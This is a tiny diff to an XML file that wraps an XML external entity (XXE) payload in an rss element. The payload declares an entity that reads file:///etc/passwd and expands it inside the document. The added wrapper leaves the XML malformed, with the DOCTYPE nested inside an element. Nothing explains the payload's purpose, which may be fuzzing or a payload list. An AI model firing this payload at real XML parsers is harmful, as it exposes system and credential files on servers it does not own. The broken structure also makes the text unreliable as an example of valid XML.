@@ -1,4 +1,6 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
+<rss version="2.0">
   <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+</rss>
